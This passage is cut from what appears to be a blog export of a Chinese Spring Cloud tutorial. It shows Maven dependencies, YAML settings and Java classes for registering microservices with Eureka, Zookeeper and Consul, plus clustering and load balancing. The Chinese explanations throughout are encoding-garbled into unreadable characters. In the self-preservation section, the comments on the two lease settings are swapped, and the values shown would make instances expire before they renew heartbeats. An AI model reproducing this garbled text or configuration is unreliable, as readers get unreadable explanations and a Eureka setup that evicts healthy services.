Serverçš„äº¤äº’,å®¢æˆ·ç«¯åŒæ—¶ä¹Ÿå…·å¤‡ä¸€ä¸ªå†…ç½®çš„ã€ä½¿ç”¨è½®è¯¢(round-robin)è´Ÿè½½ç®—æ³•çš„è´Ÿè½½å‡è¡¡å™¨.åœ¨åº”ç”¨å¯åŠ¨å,å°†ä¼šå‘Eureka Serverå‘é€å¿ƒè·³(é»˜è®¤å‘¨æœŸä¸º30ç§’)ã€‚å¦‚æœEureka Serveråœ¨å¤šä¸ªå¿ƒè·³å‘¨æœŸå†…æ²¡æœ‰æ¥å—åˆ°æŸä¸ªèŠ‚ç‚¹çš„å¿ƒè·³ï¼ŒEurekaServerå°†ä¼šä»æœåŠ¡æ³¨å†Œè¡¨ä¸­æŠŠè¿™ä¸ªæœåŠ¡èŠ‚ç‚¹ç§»é™¤(é»˜è®¤90ç§’)ã€‚ 1596526701490 æœåŠ¡ç«¯å®‰è£…æ–°å»ºmodel:cloud-eureka-server7001 pom.xml &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt;&lt;!--å¼•å…¥è‡ªå·±å®šä¹‰çš„apié€šç”¨åŒ…ï¼Œå¯ä»¥ä½¿ç”¨Paymentæ”¯ä»˜Entity--&gt; &lt;groupId&gt;com.kayleh.springcloud&lt;/groupId&gt; &lt;artifactId&gt;cloud-api-commons&lt;/artifactId&gt; &lt;version&gt;${project.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!--boot web actuator--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;/dependency&gt; &lt;/dependencies&gt; applicaiton.yml server: port: 7001 eureka: instance: hostname: localhost # eurekaæœåŠ¡ç«¯çš„å®ä¾‹åç§° client: # falseè¡¨ç¤ºä¸å‘æ³¨å†Œä¸­å¿ƒæ³¨å†Œè‡ªå·± register-with-eureka: false # falseè¡¨ç¤ºè‡ªå·±ç«¯å°±æ˜¯æ³¨å†Œä¸­å¿ƒ,æˆ‘çš„èŒè´£å°±æ˜¯ç»´æŠ¤æœåŠ¡å®ä¾‹,å¹¶ä¸éœ€è¦å»æ£€ç´¢æœåŠ¡. fetch-registry: false service-url: # è®¾ç½®ä¸Eureka Serveräº¤äº’çš„åœ°å€æŸ¥è¯¢æœåŠ¡å’Œæ³¨å†ŒæœåŠ¡éƒ½éœ€è¦ä¾èµ–è¿™ä¸ªåœ°å€. defaultZone: http://${eureka.instance.hostname}:${server.port}/eureka/ ä¸»å¯åŠ¨ç±» package com.kayleh.springcloud; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; import org.springframework.cloud.netflix.eureka.server.EnableEurekaServer; /** * @Author: Wizard * @Date: 2020/8/4 15:57 */ @SpringBootApplication @EnableEurekaServer public class EurekaMain7001 { public static void main(String[] args) { SpringApplication.run(EurekaMain7001.class, args); } } è®¿é—® http://localhost:7001 æ”¯ä»˜å¾®æœåŠ¡8001å…¥é©»è¿›EurekaServer å¾®æœåŠ¡8001çš„pomæ–‡ä»¶:æ·»åŠ åæ ‡ &lt;!--eureka-client--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt; application.ymlä¸‹æ·»åŠ  eureka: client: # è¡¨ç¤ºæ˜¯å¦å°†è‡ªå·±æ³¨å†Œè¿›eurekaServeré»˜è®¤ä¸ºtrue register-with-eureka: true # è¡¨ç¤ºä»eurekaServeræŠ“å–å·²æœ‰çš„æ³¨å†Œä¿¡æ¯ï¼Œé»˜è®¤ä¸ºtrueã€‚å•èŠ‚ç‚¹æ— æ‰€è°“ï¼Œé›†ç¾¤å¿…é¡»è®¾ç½®ä¸ºtrueæ‰èƒ½é…åˆribbonä½¿ç”¨è´Ÿè½½å‡è¡¡ fetch-registry: true service-url: # è®¾ç½®ä¸Eureka Serveräº¤äº’çš„åœ°å€æŸ¥è¯¢æœåŠ¡å’Œæ³¨å†ŒæœåŠ¡éƒ½éœ€è¦ä¾èµ–è¿™ä¸ªåœ°å€. defaultZone: http://localhost:7001/eureka ä¸»å¯åŠ¨ç±»æ·»åŠ clientæ³¨è§£ @SpringBootApplication @EnableEurekaClient public class PaymentMain8001 { public static void main(String[] args) { SpringApplication.run(PaymentMain8001.class, args); } } å¾®æœåŠ¡æ³¨å†Œåé…ç½®è¯´æ˜ 1596529308640 è®¿é—®Eurekaå‡ºç°çº¢å­—åŸå› : è‡ªæˆ‘ä¿æŠ¤æœºåˆ¶. é…ç½®å¾®æœåŠ¡80è¿›é©»Eureka; æ”¹pom,æ·»åŠ åæ ‡ æ”¹yml server: port: 80 spring: application: name: cloud-order-service eureka: client: # è¡¨ç¤ºæ˜¯å¦å°†è‡ªå·±æ³¨å†Œè¿›eurekaServeré»˜è®¤ä¸ºtrue register-with-eureka: true # è¡¨ç¤ºä»eurekaServeræŠ“å–å·²æœ‰çš„æ³¨å†Œä¿¡æ¯ï¼Œé»˜è®¤ä¸ºtrueã€‚å•èŠ‚ç‚¹æ— æ‰€è°“ï¼Œé›†ç¾¤å¿…é¡»è®¾ç½®ä¸ºtrueæ‰èƒ½é…åˆribbonä½¿ç”¨è´Ÿè½½å‡è¡¡ fetch-registry: true service-url: # è®¾ç½®ä¸Eureka Serveräº¤äº’çš„åœ°å€æŸ¥è¯¢æœåŠ¡å’Œæ³¨å†ŒæœåŠ¡éƒ½éœ€è¦ä¾èµ–è¿™ä¸ªåœ°å€. defaultZone: http://localhost:7001/eureka ä¸»å¯åŠ¨ç±»æ·»åŠ clientæ³¨è§£. é›†ç¾¤eurekaæ„å»ºeurekaé›†ç¾¤åŸç†åˆ†æ1596544509634 è§£å†³åŠæ³•:æ­å»ºeurekaæ³¨å†Œä¸­å¿ƒé›†ç¾¤,å®ç°è´Ÿè½½å‡è¡¡+æ•…éšœå®¹é”™ æ„å»ºé›†ç¾¤(å•æœºèµ°å‘é›†ç¾¤)æ–°å»ºmodel:cloud-eureka-server7002 å¤åˆ¶å¾®æœåŠ¡7001çš„pom.xml ä¿®æ”¹C:\\Windows\\System32\\drivers\\etcç›®å½•ä¸‹çš„hostsæ–‡ä»¶ æ·»åŠ è¿›hostsæ–‡ä»¶ 127.0.0.1 eureka7001.com 127.0.0.1 eureka7002.com ä¿®æ”¹7001å’Œ7002çš„application.yml (å¦‚æœæ˜¯ä¸‰å°é›†ç¾¤çš„è¯,åœ¨service-urlä¸‹ç»§ç»­å†™,ç”¨é€—å·åˆ†éš”å¼€) 7001: server: port: 7001 eureka: instance: hostname: eureka7001.com #eurekaæœåŠ¡ç«¯çš„å®ä¾‹åç§° client: # falseè¡¨ç¤ºä¸å‘æ³¨å†Œä¸­å¿ƒæ³¨å†Œè‡ªå·± register-with-eureka: false # falseè¡¨ç¤ºè‡ªå·±ç«¯å°±æ˜¯æ³¨å†Œä¸­å¿ƒ,æˆ‘çš„èŒè´£å°±æ˜¯ç»´æŠ¤æœåŠ¡å®ä¾‹,å¹¶ä¸éœ€è¦å»æ£€ç´¢æœåŠ¡. fetch-registry: false service-url: defaultZone: http://eureka7002.com:7002/eureka/ -------------------------------------------------------- 7002: server: port: 7002 eureka: instance: hostname: eureka7002.com #eurekaæœåŠ¡ç«¯çš„å®ä¾‹åç§° client: # falseè¡¨ç¤ºä¸å‘æ³¨å†Œä¸­å¿ƒæ³¨å†Œè‡ªå·± register-with-eureka: false # falseè¡¨ç¤ºè‡ªå·±ç«¯å°±æ˜¯æ³¨å†Œä¸­å¿ƒ,æˆ‘çš„èŒè´£å°±æ˜¯ç»´æŠ¤æœåŠ¡å®ä¾‹,å¹¶ä¸éœ€è¦å»æ£€ç´¢æœåŠ¡. fetch-registry: false service-url: defaultZone: http://eureka7001.com:7001/eureka/ 7002å¯åŠ¨ç±»åŠ æ³¨è§£ è®¿é—® eureka7001.com:7001 eureka7002.com:7002 å°†80å’Œ8001æ¨¡å—æ³¨å†Œè¿›eureka, ä¿®æ”¹yamlæ–‡ä»¶ defaultZone: http://eureka7001.com:7001/eureka/,http://eureka7002.com:7002/eureka/ æµ‹è¯• http://localhost/consumer/payment/get/1 æ”¯ä»˜æœåŠ¡æä¾›è€…8001é›†ç¾¤ç¯å¢ƒæ„å»ºæ–°å»ºcloud-provider-payment8002 pom.xmlå’Œ8001ä¸€è‡´ copy 8001çš„ymlæ–‡ä»¶åˆ°8002,ä¿®æ”¹ç«¯å£å· server: port: 8002 ä¸»å¯åŠ¨ç±»,ä¸šåŠ¡ç±» ç›´æ¥cpoy8001 ä¿®æ”¹8001å’Œ8002çš„controller æ·»åŠ  @Value(&quot;${server.port}&quot;) private String serverPort; ä¿®æ”¹æ‰“å° &quot;æ’å…¥æ•°æ®åº“æˆåŠŸ,serverPort&quot; + serverPort &quot;æŸ¥è¯¢æˆåŠŸ,serverPort:&quot; + serverPort è´Ÿè½½å‡è¡¡ä¿®æ”¹æ¶ˆè´¹è€…80æ¨¡å—çš„OrderControllerçš„è®¢å•æœåŠ¡è®¿é—®åœ°å€ public static final String PAYMENT_URL = &quot;http://CLOUD-PAYMENT-SERVICE&quot;; 1596602970422 ä¿®æ”¹ApplicationContextConfig @Configuration public class ApplicationContextConfig { @Bean @LoadBalanced public RestTemplate getRestTemplate() { return new RestTemplate(); } } æ·»åŠ @LoadBalancedå¼€å¯RestTemplateçš„è´Ÿè½½å‡è¡¡ æµ‹è¯• http://localhost/consumer/payment/get/1 å¯ä»¥çœ‹åˆ°8001ç«¯å£å’Œ8002ç«¯å£äº¤æ›¿å‡ºç°. Ribbonå’ŒEurekaæ•´åˆå,Consumerå¯ä»¥ç›´æ¥è°ƒç”¨æœåŠ¡è€Œä¸ç”¨å…³å¿ƒåœ°å€å’Œç«¯å£å·,ä¸”è¯¥æœåŠ¡è¿˜æœ‰è´Ÿè½½åŠŸèƒ½. axtuatorå¾®æœåŠ¡ä¿¡æ¯å®Œå–„å½“å‰é—®é¢˜ 1596603735423 æš´éœ²ä¸»æœºå ä¿®æ”¹cloud-provider-payment8001å’Œ8002 çš„yml eureka: client: # è¡¨ç¤ºæ˜¯å¦å°†è‡ªå·±æ³¨å†Œè¿›eurekaServeré»˜è®¤ä¸ºtrue register-with-eureka: true # è¡¨ç¤ºä»eurekaServeræŠ“å–å·²æœ‰çš„æ³¨å†Œä¿¡æ¯ï¼Œé»˜è®¤ä¸ºtrueã€‚å•èŠ‚ç‚¹æ— æ‰€ fetch-registry: true service-url: # è®¾ç½®ä¸Eureka Serveräº¤äº’çš„åœ°å€æŸ¥è¯¢æœåŠ¡å’Œæ³¨å†ŒæœåŠ¡éƒ½éœ€è¦ä¾èµ–è¿™ä¸ªåœ°å€. # defaultZone: http://localhost:7001/eureka/ defaultZone: http://eureka7001.com:7001/eureka/,http://eureka7002.com:7002/eureka/ instance: instance-id: payment8001 æ·»åŠ instanceé…ç½® æ›´æ”¹ä¹‹å 1596604101892 ç‚¹å¼€é“¾æ¥,æµ‹è¯• http://wizard:8002/actuator/health è®¿é—®åœ°å€æ˜¾ç¤ºipåœ°å€ ä¿®æ”¹8001,8002çš„yml,æ·»åŠ  instance: instance-id: payment8001 prefer-ip-address: true æœåŠ¡å‘ç°Discoveryå¯¹äºæ³¨å†Œè¿›eurekaé‡Œé¢çš„å¾®æœåŠ¡,å¯ä»¥é€šè¿‡æœåŠ¡å‘ç°æ¥è·å¾—è¯¥æœåŠ¡çš„ä¿¡æ¯. ä¿®æ”¹8001çš„controller æ·»åŠ  @Resource private DiscoveryClient discoveryClient; @GetMapping(value = &quot;/payment/discovery&quot;) public Object discovery() { List&lt;String&gt; services = discoveryClient.getServices(); for (String element : services) { log.info(&quot;----------element:&quot; + element); } List&lt;ServiceInstance&gt; instances = discoveryClient.getInstances(&quot;CLOUD-PAYMENT-SERVICE&quot;); for (ServiceInstance instance : instances) { log.info(instance.getServiceId() + &quot;\\t&quot; + instance.getHost() + &quot;\\t&quot; + instance.getPort() + &quot;\\t&quot; + instance.getUri()); } return this.discoveryClient; } å¯åŠ¨ç±»æ·»åŠ æ³¨è§£ @SpringBootApplication @EnableEurekaClient @EnableDiscoveryClient public class PaymentMain8001 { public static void main(String[] args) { SpringApplication.run(PaymentMain8001.class, args); } } æµ‹è¯• http://localhost:8001/payment/discovery ------------------------------------------ {&quot;services&quot;:[&quot;cloud-order-service&quot;,&quot;cloud-payment-service&quot;],&quot;order&quot;:0} 1596605686156 Eurekaçš„è‡ªæˆ‘ä¿æŠ¤æœºåˆ¶æ•…éšœç°è±¡: 1596605819802 å¯¼è‡´åŸå› : æŸæ—¶åˆ»æŸä¸€ä¸ªå¾®æœåŠ¡ä¸å¯ç”¨äº†,Eurekaä¸ä¼šç«‹åˆ»æ¸…ç†,ä¾æ—§ä¼šå¯¹è¯¥å¾®æœåŠ¡çš„ä¿¡æ¯è¿›è¡Œä¿å­˜. å±äºCAPé‡Œé¢çš„APåˆ†æ”¯ 1596606071261 1596606189669 1596606288542 å…³é—­è‡ªæˆ‘ä¿æŠ¤ ä¿®æ”¹7001çš„yaml æ·»åŠ  server: enable-self-preservation: false --------------------------------------- eureka: instance: hostname: eureka7001.com client: register-with-eureka: false fetch-registry: false service-url: defaultZone: http://eureka7002.com:7002/eureka/ server: #å…³é—­è‡ªæˆ‘ä¿æŠ¤æœºåˆ¶ï¼Œä¿è¯ä¸å¯ç”¨æœåŠ¡è¢«åŠæ—¶åˆ é™¤ enable-self-preservation: false #æ—¶é—´é—´éš” eviction-interval-timer-in-ms: 2000 8001çš„ymlåŠ å…¥ instance: instance-id: payment8001 prefer-ip-address: true # eurekaå®¢æˆ·ç«¯å‘æœåŠ¡ç«¯å‘é€å¿ƒè·³çš„æ—¶é—´é—´éš”ï¼Œå•ä½ä¸ºç§’ï¼ˆé»˜è®¤æ˜¯30ç§’ï¼‰ lease-expiration-duration-in-seconds: 1 # eurekaæœåŠ¡ç«¯åœ¨æ”¶åˆ°æœ€åä¸€æ¬¡å¿ƒè·³åç­‰å¾…æ—¶é—´ä¸Šé™ï¼Œå•ä½ä¸ºç§’ï¼ˆé»˜è®¤æ˜¯90ç§’ï¼‰ï¼Œè¶…æ—¶å°†å‰”é™¤æœåŠ¡ lease-renewal-interval-in-seconds: 2 Zookepperéœ€è¦Linuxå®‰è£…Zookepper æ–°å»ºå·¥ç¨‹cloud-provider-payment8004 pom.xml &lt;dependencies&gt; &lt;!-- Zookeeperå®¢æˆ·ç«¯--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-zookeeper-discovery&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt;&lt;!--å¼•å…¥è‡ªå·±å®šä¹‰çš„apié€šç”¨åŒ…ï¼Œå¯ä»¥ä½¿ç”¨Paymentæ”¯ä»˜Entity--&gt; &lt;groupId&gt;com.kayleh.springcloud&lt;/groupId&gt; &lt;artifactId&gt;cloud-api-commons&lt;/artifactId&gt; &lt;version&gt;${project.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- çƒ­éƒ¨ç½²--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;/dependencies&gt; application.yml server: port: 8004 #æœåŠ¡åˆ«å spring: application: name: cloud-provider-payment cloud: zookeeper: # zookeeperçš„æœºå™¨ipåŠ ç«¯å£å· connect-string: 192.168.111.144:2181 å¯åŠ¨ç±» package com.kayleh.springcloud; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; import org.springframework.cloud.client.discovery.EnableDiscoveryClient; /** * @Author: Wizard * @Date: 2020/8/5 16:58 */ @SpringBootApplication @EnableDiscoveryClient public class PaymentMain8004 { public static void main(String[] args) { SpringApplication.run(PaymentMain8004.class, args); } } PaymentController package com.kayleh.springcloud.controller; import lombok.extern.slf4j.Slf4j; import org.springframework.beans.factory.annotation.Value; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RestController; import java.util.UUID; /** * @Author: Wizard * @Date: 2020/8/5 17:00 */ @RestController @Slf4j public class PaymentController { @Value(&quot;${server.port}&quot;) private String serverPort; @RequestMapping(value = &quot;/payment/zk&quot;) public String paymentzk() { return &quot;Springcloud with zookeeper:&quot; + serverPort + &quot;\\t&quot; + UUID.randomUUID().toString(); } } jaråŒ…å†²çª &lt;!-- Zookeeperå®¢æˆ·ç«¯--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-zookeeper-discovery&lt;/artifactId&gt; &lt;!-- æ’é™¤è‡ªå¸¦çš„zookeeper3.5.3--&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;org.apache.zookeeper&lt;/groupId&gt; &lt;artifactId&gt;zookeeper&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt; &lt;!-- æ·»åŠ zookeeper3.4.9--&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.zookeeper&lt;/groupId&gt; &lt;artifactId&gt;zookeeper&lt;/artifactId&gt; &lt;version&gt;3.4.9&lt;/version&gt; &lt;/dependency&gt; æµ‹è¯• 1596618784943 è®¿é—® localhost:8004/payment/zk 1596618927219 æ˜¯ä¸´æ—¶èŠ‚ç‚¹ï¼Œé¡¹ç›®åœæ­¢åï¼Œè¿æ¥ä¼šæŒç»­ä¸€å°æ®µæ—¶é—´ï¼Œç„¶åä¸¢å¤±ã€‚é‡æ–°è¿æ¥åæ˜¯å¦ä¸€ä¸ªUUIDçš„Zookepperã€‚ 1596626952182 è®¢å•æœåŠ¡æ³¨å†Œzookeeper æ–°å»ºcloud-consumerzk-order80 å¤åˆ¶80çš„pom yml server: port: 80 #æœåŠ¡åˆ«å spring: application: name: cloud-consumer-order cloud: zookeeper: # zookeeperçš„æœºå™¨ipåŠ ç«¯å£å· connect-string: 192.168.111.144:2181 å¯åŠ¨: package com.kayleh.springcloud; @SpringBootApplication @EnableDiscoveryClient public class OrderZkMain80 { public static void main(String[] args) { SpringApplication.run(OrderZkMain80.class, args); } } config: package com.kayleh.springcloud.config; @Configuration public class ApplicationContextConfig { @Bean @LoadBalanced public RestTemplate getRestTemplate() { return new RestTemplate(); } } controller package com.kayleh.springcloud.controller; @RestController @Slf4j public class OrderZkController { public static final String INVOKE_URL = &quot;http://cloud-provider-payment&quot;; @Resource private RestTemplate restTemplate; @GetMapping(&quot;/consumer/payment/create&quot;) public CommonResult&lt;Payment&gt; create(Payment payment) { return restTemplate.postForObject(INVOKE_URL + &quot;/payment/create&quot;, payment, CommonResult.class); } @GetMapping(&quot;/consumer/payment/get/{id}&quot;) public CommonResult&lt;Payment&gt; getPayment(@PathVariable(&quot;id&quot;) Long id) { return restTemplate.getForObject(INVOKE_URL + &quot;/payment/get/&quot; + id, CommonResult.class); } } æœåŠ¡è®¿é—®åœ°å€INVOKE_URLå¡«linuxä¸Šçš„zookeeperåç§° 1596627798682 æµ‹è¯•,å¯åŠ¨ 80zk å’Œ 8004. 1596628332087 è®¿é—® http://localhost/consumer/payment/zk Consul1596629165834 https://www.consul.io/downloads.html 1596629552902 å¯åŠ¨ consul agent -dev è®¿é—® http://localhost:8500/ui/ æœåŠ¡æä¾›è€…æ³¨å†Œè¿›Consulæ–°å»ºæ¨¡å—cloud-providerConsul-payment8006 pom.xml &lt;dependencies&gt; &lt;!--consul--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-consul-discovery&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt;&lt;!--å¼•å…¥è‡ªå·±å®šä¹‰çš„apié€šç”¨åŒ…ï¼Œå¯ä»¥ä½¿ç”¨Paymentæ”¯ä»˜Entity--&gt; &lt;groupId&gt;com.kayleh.springcloud&lt;/groupId&gt; &lt;artifactId&gt;cloud-api-commons&lt;/artifactId&gt; &lt;version&gt;${project.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.1.10&lt;/version&gt; &lt;/dependency&gt; &lt;!-- mysql--&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-jdbc&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- çƒ­éƒ¨ç½²--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;/dependencies&gt; yml server: port: 8006 #æœåŠ¡åˆ«å spring: application: name: consul-provider-payment ###consulæ³¨å†Œä¸­å¿ƒåœ°å€ cloud: consul: host: localhost port: 8500 discovery: service-name: ${spring.application.name} # hostname: 127.0.0.1 ä¸»å¯åŠ¨ç±» controller @RestController @Slf4j public class PaymentController { @Value(&quot;${server.port}&quot;) private String serverPort; @RequestMapping(value = &quot;/payment/consul&quot;) public String paymentConsul() { return &quot;Springcloud with consul:&quot; + serverPort + &quot;\\t&quot; + UUID.randomUUID().toString(); } } æµ‹è¯• http://localhost:8006/payment/consul æœåŠ¡æ¶ˆè´¹è€…æ³¨å†Œè¿›Consulæ–°å»ºæ¨¡å—cloud-consumer-consul-order80 pom.xml &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-consul-discovery&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; ä¸»å¯åŠ¨ç±» å¤åˆ¶cloud-consumerzk-order80æ¨¡å—çš„ApplicationContextConfig controller @RestController @Slf4j public class OrderConsulController { public static final String INVOKE_URL = &quot;http://consul-provider-payment&quot;; @Resource private RestTemplate restTemplate; @GetMapping(&quot;/consumer/payment/consul&quot;) public String paymentInfo() { String result = restTemplate.getForObject(INVOKE_URL + &quot;/payment/consul&quot;, String.class); return result; } } ä¸‰ä¸ªæ³¨å†Œä¸­å¿ƒçš„å¼‚åŒ1596714189759 1596714223828 1596714422562 C : Consistency(å¼ºä¸€è‡´æ€§) A : Availability(å¯ç”¨æ€§) P : Partition tolerance(åˆ†åŒºå®¹é”™æ€§) CAPç†è®ºå…³æ³¨ç²’åº¦æ˜¯æ•°æ®ï¼Œè€Œä¸æ˜¯æ•´ä½“ç³»ç»Ÿè®¾è®¡çš„ç­–ç•¥ APæ¶æ„å½“ç½‘ç»œåˆ†åŒºå‡ºç°åï¼Œä¸ºäº†ä¿è¯å¯ç”¨æ€§ï¼Œç³»ç»ŸBå¯ç”¨è¿”å›æ—§å€¼ï¼Œä¿è¯ç³»ç»Ÿçš„å¯ç”¨æ€§ ç»“è®ºï¼šè¿èƒŒäº†ä¸€è‡´æ€§Cçš„è¦æ±‚ï¼Œåªæ»¡è¶³å¯ç”¨æ€§å’Œåˆ†åŒºå®¹é”™ï¼Œå³AP 1596714606488\" style=\"zoom: 67%; CPæ¶æ„å½“ç½‘ç»œåˆ†åŒºå‡ºç°åï¼Œä¸ºäº†ä¿è¯ä¸€è‡´æ€§ï¼Œå°±å¿…é¡»æ‹’æ¥è¯·æ±‚ï¼Œå¦åˆ™æ— æ³•ä¿è¯ä¸€è‡´æ€§ã€‚ ç»“è®ºï¼šè¿èƒŒäº†å¯ç”¨æ€§Açš„è¦æ±‚ï¼Œåªæ»¡è¶³ä¸€è‡´æ€§å’Œåˆ†åŒºå®¹é”™ï¼Œå³CP 1596714860983","categories":[{"name":"åˆ†å¸ƒå¼","slug":"åˆ†å¸ƒå¼","permalink":"https://blog.kayleh.top/categories/%E5%88%86%E5%B8%83%E5%BC%8F/"}],"tags":[{"name":"DistributedMicroservices","slug":"DistributedMicroservices","permalink":"https://blog.kayleh.top/tags/DistributedMicroservices/"}]},{"title":"SpringCloud","slug":"åˆ†å¸ƒå¼çš„å¾®æœåŠ¡æ¶æ„1","date":"2020-08-02T22:07:44.000Z","updated":"2021-04-11T17:11:28.644Z","comments":true,"path":"åˆ†å¸ƒå¼çš„å¾®æœåŠ¡æ¶æ„1/","link":"","permalink":"https://blog.kayleh.top/%E5%88%86%E5%B8%83%E5%BC%8F%E7%9A%84%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%9E%B6%E6%9E%841/","excerpt":"SpringCloudâ€”â€”åŸºäºåˆ†å¸ƒå¼çš„å¾®æœåŠ¡æ¶æ„","text":"SpringCloudâ€”â€”åŸº